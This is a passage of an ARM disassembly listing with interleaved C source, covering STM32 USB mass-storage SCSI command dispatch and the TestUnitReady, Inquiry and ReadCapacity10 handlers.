 8009bac:	08009cf5 	.word	0x08009cf5
 8009bb0:	08009cf5 	.word	0x08009cf5
 8009bb4:	08009cf5 	.word	0x08009cf5
 8009bb8:	08009cf5 	.word	0x08009cf5
 8009bbc:	08009cf5 	.word	0x08009cf5
 8009bc0:	08009cf5 	.word	0x08009cf5
 8009bc4:	08009cf5 	.word	0x08009cf5
 8009bc8:	08009cf5 	.word	0x08009cf5
 8009bcc:	08009cf5 	.word	0x08009cf5
 8009bd0:	08009cf5 	.word	0x08009cf5
 8009bd4:	08009cf5 	.word	0x08009cf5
 8009bd8:	08009cf5 	.word	0x08009cf5
 8009bdc:	08009c53 	.word	0x08009c53
 8009be0:	2b9e      	cmp	r3, #158	; 0x9e
 8009be2:	d051      	beq.n	8009c88 <SCSI_ProcessCmd+0x274>
 8009be4:	e086      	b.n	8009cf4 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 8009be6:	7afb      	ldrb	r3, [r7, #11]
 8009be8:	687a      	ldr	r2, [r7, #4]
 8009bea:	4619      	mov	r1, r3
 8009bec:	68f8      	ldr	r0, [r7, #12]
 8009bee:	f000 f893 	bl	8009d18 <SCSI_TestUnitReady>
 8009bf2:	4603      	mov	r3, r0
 8009bf4:	75fb      	strb	r3, [r7, #23]
      break;
 8009bf6:	e089      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009bf8:	7afb      	ldrb	r3, [r7, #11]
 8009bfa:	687a      	ldr	r2, [r7, #4]
 8009bfc:	4619      	mov	r1, r3
 8009bfe:	68f8      	ldr	r0, [r7, #12]
 8009c00:	f000 fb9a 	bl	800a338 <SCSI_RequestSense>
 8009c04:	4603      	mov	r3, r0
 8009c06:	75fb      	strb	r3, [r7, #23]
      break;
 8009c08:	e080      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009c0a:	7afb      	ldrb	r3, [r7, #11]
 8009c0c:	687a      	ldr	r2, [r7, #4]
 8009c0e:	4619      	mov	r1, r3
 8009c10:	68f8      	ldr	r0, [r7, #12]
 8009c12:	f000 f8df 	bl	8009dd4 <SCSI_Inquiry>
 8009c16:	4603      	mov	r3, r0
 8009c18:	75fb      	strb	r3, [r7, #23]
      break;
 8009c1a:	e077      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009c1c:	7afb      	ldrb	r3, [r7, #11]
 8009c1e:	687a      	ldr	r2, [r7, #4]
 8009c20:	4619      	mov	r1, r3
 8009c22:	68f8      	ldr	r0, [r7, #12]
 8009c24:	f000 fc7e 	bl	800a524 <SCSI_StartStopUnit>
 8009c28:	4603      	mov	r3, r0
 8009c2a:	75fb      	strb	r3, [r7, #23]
      break;
 8009c2c:	e06e      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009c2e:	7afb      	ldrb	r3, [r7, #11]
 8009c30:	687a      	ldr	r2, [r7, #4]
 8009c32:	4619      	mov	r1, r3
 8009c34:	68f8      	ldr	r0, [r7, #12]
 8009c36:	f000 fcd2 	bl	800a5de <SCSI_AllowPreventRemovable>
 8009c3a:	4603      	mov	r3, r0
 8009c3c:	75fb      	strb	r3, [r7, #23]
      break;
 8009c3e:	e065      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009c40:	7afb      	ldrb	r3, [r7, #11]
 8009c42:	687a      	ldr	r2, [r7, #4]
 8009c44:	4619      	mov	r1, r3
 8009c46:	68f8      	ldr	r0, [r7, #12]
 8009c48:	f000 fb16 	bl	800a278 <SCSI_ModeSense6>
 8009c4c:	4603      	mov	r3, r0
 8009c4e:	75fb      	strb	r3, [r7, #23]
      break;
 8009c50:	e05c      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009c52:	7afb      	ldrb	r3, [r7, #11]
 8009c54:	687a      	ldr	r2, [r7, #4]
 8009c56:	4619      	mov	r1, r3
 8009c58:	68f8      	ldr	r0, [r7, #12]
 8009c5a:	f000 fb3d 	bl	800a2d8 <SCSI_ModeSense10>
 8009c5e:	4603      	mov	r3, r0
 8009c60:	75fb      	strb	r3, [r7, #23]
      break;
 8009c62:	e053      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009c64:	7afb      	ldrb	r3, [r7, #11]
 8009c66:	687a      	ldr	r2, [r7, #4]
 8009c68:	4619      	mov	r1, r3
 8009c6a:	68f8      	ldr	r0, [r7, #12]
 8009c6c:	f000 fa86 	bl	800a17c <SCSI_ReadFormatCapacity>
 8009c70:	4603      	mov	r3, r0
 8009c72:	75fb      	strb	r3, [r7, #23]
      break;
 8009c74:	e04a      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009c76:	7afb      	ldrb	r3, [r7, #11]
 8009c78:	687a      	ldr	r2, [r7, #4]
 8009c7a:	4619      	mov	r1, r3
 8009c7c:	68f8      	ldr	r0, [r7, #12]
 8009c7e:	f000 f929 	bl	8009ed4 <SCSI_ReadCapacity10>
 8009c82:	4603      	mov	r3, r0
 8009c84:	75fb      	strb	r3, [r7, #23]
      break;
 8009c86:	e041      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009c88:	7afb      	ldrb	r3, [r7, #11]
 8009c8a:	687a      	ldr	r2, [r7, #4]
 8009c8c:	4619      	mov	r1, r3
 8009c8e:	68f8      	ldr	r0, [r7, #12]
 8009c90:	f000 f9af 	bl	8009ff2 <SCSI_ReadCapacity16>
 8009c94:	4603      	mov	r3, r0
 8009c96:	75fb      	strb	r3, [r7, #23]
      break;
 8009c98:	e038      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009c9a:	7afb      	ldrb	r3, [r7, #11]
 8009c9c:	687a      	ldr	r2, [r7, #4]
 8009c9e:	4619      	mov	r1, r3
 8009ca0:	68f8      	ldr	r0, [r7, #12]
 8009ca2:	f000 fccd 	bl	800a640 <SCSI_Read10>
 8009ca6:	4603      	mov	r3, r0
 8009ca8:	75fb      	strb	r3, [r7, #23]
      break;
 8009caa:	e02f      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009cac:	7afb      	ldrb	r3, [r7, #11]
 8009cae:	687a      	ldr	r2, [r7, #4]
 8009cb0:	4619      	mov	r1, r3
 8009cb2:	68f8      	ldr	r0, [r7, #12]
 8009cb4:	f000 fd7b 	bl	800a7ae <SCSI_Read12>
 8009cb8:	4603      	mov	r3, r0
 8009cba:	75fb      	strb	r3, [r7, #23]
      break;
 8009cbc:	e026      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009cbe:	7afb      	ldrb	r3, [r7, #11]
 8009cc0:	687a      	ldr	r2, [r7, #4]
 8009cc2:	4619      	mov	r1, r3
 8009cc4:	68f8      	ldr	r0, [r7, #12]
 8009cc6:	f000 fe33 	bl	800a930 <SCSI_Write10>
 8009cca:	4603      	mov	r3, r0
 8009ccc:	75fb      	strb	r3, [r7, #23]
      break;
 8009cce:	e01d      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009cd0:	7afb      	ldrb	r3, [r7, #11]
 8009cd2:	687a      	ldr	r2, [r7, #4]
 8009cd4:	4619      	mov	r1, r3
 8009cd6:	68f8      	ldr	r0, [r7, #12]
 8009cd8:	f000 ff0e 	bl	800aaf8 <SCSI_Write12>
 8009cdc:	4603      	mov	r3, r0
 8009cde:	75fb      	strb	r3, [r7, #23]
      break;
 8009ce0:	e014      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009ce2:	7afb      	ldrb	r3, [r7, #11]
 8009ce4:	687a      	ldr	r2, [r7, #4]
 8009ce6:	4619      	mov	r1, r3
 8009ce8:	68f8      	ldr	r0, [r7, #12]
 8009cea:	f000 fff9 	bl	800ace0 <SCSI_Verify10>
 8009cee:	4603      	mov	r3, r0
 8009cf0:	75fb      	strb	r3, [r7, #23]
      break;
 8009cf2:	e00b      	b.n	8009d0c <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009cf4:	7af9      	ldrb	r1, [r7, #11]
 8009cf6:	2320      	movs	r3, #32
 8009cf8:	2205      	movs	r2, #5
 8009cfa:	68f8      	ldr	r0, [r7, #12]
 8009cfc:	f000 fbb6 	bl	800a46c <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009d00:	693b      	ldr	r3, [r7, #16]
 8009d02:	2202      	movs	r2, #2
 8009d04:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009d06:	23ff      	movs	r3, #255	; 0xff
 8009d08:	75fb      	strb	r3, [r7, #23]
      break;
 8009d0a:	bf00      	nop
  }

  return ret;
 8009d0c:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009d10:	4618      	mov	r0, r3
 8009d12:	3718      	adds	r7, #24
 8009d14:	46bd      	mov	sp, r7
 8009d16:	bd80      	pop	{r7, pc}

08009d18 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d18:	b580      	push	{r7, lr}
 8009d1a:	b086      	sub	sp, #24
 8009d1c:	af00      	add	r7, sp, #0
 8009d1e:	60f8      	str	r0, [r7, #12]
 8009d20:	460b      	mov	r3, r1
 8009d22:	607a      	str	r2, [r7, #4]
 8009d24:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d26:	68fb      	ldr	r3, [r7, #12]
 8009d28:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d2c:	68fb      	ldr	r3, [r7, #12]
 8009d2e:	32b0      	adds	r2, #176	; 0xb0
 8009d30:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d34:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009d36:	697b      	ldr	r3, [r7, #20]
 8009d38:	2b00      	cmp	r3, #0
 8009d3a:	d102      	bne.n	8009d42 <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009d3c:	f04f 33ff 	mov.w	r3, #4294967295
 8009d40:	e043      	b.n	8009dca <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009d42:	697b      	ldr	r3, [r7, #20]
 8009d44:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d48:	699b      	ldr	r3, [r3, #24]
 8009d4a:	2b00      	cmp	r3, #0
 8009d4c:	d00b      	beq.n	8009d66 <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009d4e:	697b      	ldr	r3, [r7, #20]
 8009d50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d54:	7f59      	ldrb	r1, [r3, #29]
 8009d56:	2320      	movs	r3, #32
 8009d58:	2205      	movs	r2, #5
 8009d5a:	68f8      	ldr	r0, [r7, #12]
 8009d5c:	f000 fb86 	bl	800a46c <SCSI_SenseCode>

    return -1;
 8009d60:	f04f 33ff 	mov.w	r3, #4294967295
 8009d64:	e031      	b.n	8009dca <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009d66:	697b      	ldr	r3, [r7, #20]
 8009d68:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d6c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009d70:	2b02      	cmp	r3, #2
 8009d72:	d10b      	bne.n	8009d8c <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d74:	7af9      	ldrb	r1, [r7, #11]
 8009d76:	233a      	movs	r3, #58	; 0x3a
 8009d78:	2202      	movs	r2, #2
 8009d7a:	68f8      	ldr	r0, [r7, #12]
 8009d7c:	f000 fb76 	bl	800a46c <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009d80:	697b      	ldr	r3, [r7, #20]
 8009d82:	2205      	movs	r2, #5
 8009d84:	721a      	strb	r2, [r3, #8]
    return -1;
 8009d86:	f04f 33ff 	mov.w	r3, #4294967295
 8009d8a:	e01e      	b.n	8009dca <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009d8c:	68fb      	ldr	r3, [r7, #12]
 8009d8e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d92:	68fa      	ldr	r2, [r7, #12]
 8009d94:	33b0      	adds	r3, #176	; 0xb0
 8009d96:	009b      	lsls	r3, r3, #2
 8009d98:	4413      	add	r3, r2
 8009d9a:	685b      	ldr	r3, [r3, #4]
 8009d9c:	689b      	ldr	r3, [r3, #8]
 8009d9e:	7afa      	ldrb	r2, [r7, #11]
 8009da0:	4610      	mov	r0, r2
 8009da2:	4798      	blx	r3
 8009da4:	4603      	mov	r3, r0
 8009da6:	2b00      	cmp	r3, #0
 8009da8:	d00b      	beq.n	8009dc2 <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009daa:	7af9      	ldrb	r1, [r7, #11]
 8009dac:	233a      	movs	r3, #58	; 0x3a
 8009dae:	2202      	movs	r2, #2
 8009db0:	68f8      	ldr	r0, [r7, #12]
 8009db2:	f000 fb5b 	bl	800a46c <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009db6:	697b      	ldr	r3, [r7, #20]
 8009db8:	2205      	movs	r2, #5
 8009dba:	721a      	strb	r2, [r3, #8]

    return -1;
 8009dbc:	f04f 33ff 	mov.w	r3, #4294967295
 8009dc0:	e003      	b.n	8009dca <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009dc2:	697b      	ldr	r3, [r7, #20]
 8009dc4:	2200      	movs	r2, #0
 8009dc6:	60da      	str	r2, [r3, #12]

  return 0;
 8009dc8:	2300      	movs	r3, #0
}
 8009dca:	4618      	mov	r0, r3
 8009dcc:	3718      	adds	r7, #24
 8009dce:	46bd      	mov	sp, r7
 8009dd0:	bd80      	pop	{r7, pc}
	...

08009dd4 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009dd4:	b580      	push	{r7, lr}
 8009dd6:	b088      	sub	sp, #32
 8009dd8:	af00      	add	r7, sp, #0
 8009dda:	60f8      	str	r0, [r7, #12]
 8009ddc:	460b      	mov	r3, r1
 8009dde:	607a      	str	r2, [r7, #4]
 8009de0:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009de2:	68fb      	ldr	r3, [r7, #12]
 8009de4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009de8:	68fb      	ldr	r3, [r7, #12]
 8009dea:	32b0      	adds	r2, #176	; 0xb0
 8009dec:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009df0:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009df2:	69bb      	ldr	r3, [r7, #24]
 8009df4:	2b00      	cmp	r3, #0
 8009df6:	d102      	bne.n	8009dfe <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009df8:	f04f 33ff 	mov.w	r3, #4294967295
 8009dfc:	e062      	b.n	8009ec4 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009dfe:	69bb      	ldr	r3, [r7, #24]
 8009e00:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e04:	699b      	ldr	r3, [r3, #24]
 8009e06:	2b00      	cmp	r3, #0
 8009e08:	d10b      	bne.n	8009e22 <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009e0a:	69bb      	ldr	r3, [r7, #24]
 8009e0c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e10:	7f59      	ldrb	r1, [r3, #29]
 8009e12:	2320      	movs	r3, #32
 8009e14:	2205      	movs	r2, #5
 8009e16:	68f8      	ldr	r0, [r7, #12]
 8009e18:	f000 fb28 	bl	800a46c <SCSI_SenseCode>
    return -1;
 8009e1c:	f04f 33ff 	mov.w	r3, #4294967295
 8009e20:	e050      	b.n	8009ec4 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009e22:	687b      	ldr	r3, [r7, #4]
 8009e24:	3301      	adds	r3, #1
 8009e26:	781b      	ldrb	r3, [r3, #0]
 8009e28:	f003 0301 	and.w	r3, r3, #1
 8009e2c:	2b00      	cmp	r3, #0
 8009e2e:	d021      	beq.n	8009e74 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009e30:	687b      	ldr	r3, [r7, #4]
 8009e32:	3302      	adds	r3, #2
 8009e34:	781b      	ldrb	r3, [r3, #0]
 8009e36:	2b00      	cmp	r3, #0
 8009e38:	d105      	bne.n	8009e46 <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009e3a:	2206      	movs	r2, #6
 8009e3c:	4923      	ldr	r1, [pc, #140]	; (8009ecc <SCSI_Inquiry+0xf8>)
 8009e3e:	69b8      	ldr	r0, [r7, #24]
 8009e40:	f001 f8fa 	bl	800b038 <SCSI_UpdateBotData>
 8009e44:	e03d      	b.n	8009ec2 <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009e46:	687b      	ldr	r3, [r7, #4]
 8009e48:	3302      	adds	r3, #2
 8009e4a:	781b      	ldrb	r3, [r3, #0]
 8009e4c:	2b80      	cmp	r3, #128	; 0x80
 8009e4e:	d105      	bne.n	8009e5c <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009e50:	2208      	movs	r2, #8
 8009e52:	491f      	ldr	r1, [pc, #124]	; (8009ed0 <SCSI_Inquiry+0xfc>)
 8009e54:	69b8      	ldr	r0, [r7, #24]
 8009e56:	f001 f8ef 	bl	800b038 <SCSI_UpdateBotData>
 8009e5a:	e032      	b.n	8009ec2 <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009e5c:	69bb      	ldr	r3, [r7, #24]
 8009e5e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e62:	7f59      	ldrb	r1, [r3, #29]
 8009e64:	2324      	movs	r3, #36	; 0x24
 8009e66:	2205      	movs	r2, #5
 8009e68:	68f8      	ldr	r0, [r7, #12]
 8009e6a:	f000 faff 	bl	800a46c <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009e6e:	f04f 33ff 	mov.w	r3, #4294967295
 8009e72:	e027      	b.n	8009ec4 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009e74:	68fb      	ldr	r3, [r7, #12]
 8009e76:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e7a:	68fa      	ldr	r2, [r7, #12]
 8009e7c:	33b0      	adds	r3, #176	; 0xb0
 8009e7e:	009b      	lsls	r3, r3, #2
 8009e80:	4413      	add	r3, r2
 8009e82:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009e84:	69d9      	ldr	r1, [r3, #28]
 8009e86:	7afa      	ldrb	r2, [r7, #11]
 8009e88:	4613      	mov	r3, r2
 8009e8a:	00db      	lsls	r3, r3, #3
 8009e8c:	4413      	add	r3, r2
 8009e8e:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009e90:	440b      	add	r3, r1
 8009e92:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009e94:	697b      	ldr	r3, [r7, #20]
 8009e96:	3304      	adds	r3, #4
 8009e98:	781b      	ldrb	r3, [r3, #0]
 8009e9a:	b29b      	uxth	r3, r3
 8009e9c:	3305      	adds	r3, #5
 8009e9e:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009ea0:	687b      	ldr	r3, [r7, #4]
 8009ea2:	3304      	adds	r3, #4
 8009ea4:	781b      	ldrb	r3, [r3, #0]
 8009ea6:	b29b      	uxth	r3, r3
 8009ea8:	8bfa      	ldrh	r2, [r7, #30]
 8009eaa:	429a      	cmp	r2, r3
 8009eac:	d303      	bcc.n	8009eb6 <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009eae:	687b      	ldr	r3, [r7, #4]
 8009eb0:	3304      	adds	r3, #4
 8009eb2:	781b      	ldrb	r3, [r3, #0]
 8009eb4:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009eb6:	8bfb      	ldrh	r3, [r7, #30]
 8009eb8:	461a      	mov	r2, r3
 8009eba:	6979      	ldr	r1, [r7, #20]
 8009ebc:	69b8      	ldr	r0, [r7, #24]
 8009ebe:	f001 f8bb 	bl	800b038 <SCSI_UpdateBotData>
  }

  return 0;
 8009ec2:	2300      	movs	r3, #0
}
 8009ec4:	4618      	mov	r0, r3
 8009ec6:	3720      	adds	r7, #32
 8009ec8:	46bd      	mov	sp, r7
 8009eca:	bd80      	pop	{r7, pc}
 8009ecc:	2000010c 	.word	0x2000010c
 8009ed0:	20000114 	.word	0x20000114

08009ed4 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ed4:	b590      	push	{r4, r7, lr}
 8009ed6:	b087      	sub	sp, #28
 8009ed8:	af00      	add	r7, sp, #0
 8009eda:	60f8      	str	r0, [r7, #12]
 8009edc:	460b      	mov	r3, r1
 8009ede:	607a      	str	r2, [r7, #4]
 8009ee0:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009ee2:	68fb      	ldr	r3, [r7, #12]
 8009ee4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ee8:	68fb      	ldr	r3, [r7, #12]
 8009eea:	32b0      	adds	r2, #176	; 0xb0
 8009eec:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ef0:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009ef2:	697b      	ldr	r3, [r7, #20]
 8009ef4:	2b00      	cmp	r3, #0
 8009ef6:	d102      	bne.n	8009efe <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009ef8:	f04f 33ff 	mov.w	r3, #4294967295
 8009efc:	e075      	b.n	8009fea <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009efe:	68fb      	ldr	r3, [r7, #12]
 8009f00:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f04:	68fa      	ldr	r2, [r7, #12]
 8009f06:	33b0      	adds	r3, #176	; 0xb0
 8009f08:	009b      	lsls	r3, r3, #2
 8009f0a:	4413      	add	r3, r2
 8009f0c:	685b      	ldr	r3, [r3, #4]
 8009f0e:	685c      	ldr	r4, [r3, #4]
 8009f10:	697b      	ldr	r3, [r7, #20]
 8009f12:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009f16:	3308      	adds	r3, #8
 8009f18:	697a      	ldr	r2, [r7, #20]
 8009f1a:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009f1e:	3204      	adds	r2, #4
 8009f20:	7af8      	ldrb	r0, [r7, #11]
 8009f22:	4619      	mov	r1, r3
 8009f24:	47a0      	blx	r4
 8009f26:	4603      	mov	r3, r0
 8009f28:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f2a:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009f2e:	2b00      	cmp	r3, #0
 8009f30:	d106      	bne.n	8009f40 <SCSI_ReadCapacity10+0x6c>
 8009f32:	697b      	ldr	r3, [r7, #20]
 8009f34:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f38:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f3c:	2b02      	cmp	r3, #2
 8009f3e:	d108      	bne.n	8009f52 <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f40:	7af9      	ldrb	r1, [r7, #11]
 8009f42:	233a      	movs	r3, #58	; 0x3a
 8009f44:	2202      	movs	r2, #2
 8009f46:	68f8      	ldr	r0, [r7, #12]
 8009f48:	f000 fa90 	bl	800a46c <SCSI_SenseCode>
    return -1;
 8009f4c:	f04f 33ff 	mov.w	r3, #4294967295
 8009f50:	e04b      	b.n	8009fea <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009f52:	697b      	ldr	r3, [r7, #20]
 8009f54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f58:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f5a:	3b01      	subs	r3, #1
 8009f5c:	0e1b      	lsrs	r3, r3, #24
 8009f5e:	b2da      	uxtb	r2, r3
 8009f60:	697b      	ldr	r3, [r7, #20]
 8009f62:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009f64:	697b      	ldr	r3, [r7, #20]
 8009f66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f6a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f6c:	3b01      	subs	r3, #1
 8009f6e:	0c1b      	lsrs	r3, r3, #16
 8009f70:	b2da      	uxtb	r2, r3
 8009f72:	697b      	ldr	r3, [r7, #20]
 8009f74:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009f76:	697b      	ldr	r3, [r7, #20]
 8009f78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f7c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f7e:	3b01      	subs	r3, #1
 8009f80:	0a1b      	lsrs	r3, r3, #8
 8009f82:	b2da      	uxtb	r2, r3
 8009f84:	697b      	ldr	r3, [r7, #20]
 8009f86:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009f88:	697b      	ldr	r3, [r7, #20]
 8009f8a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f8e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f90:	b2db      	uxtb	r3, r3
 8009f92:	3b01      	subs	r3, #1
 8009f94:	b2da      	uxtb	r2, r3
 8009f96:	697b      	ldr	r3, [r7, #20]
 8009f98:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009f9a:	697b      	ldr	r3, [r7, #20]
 8009f9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
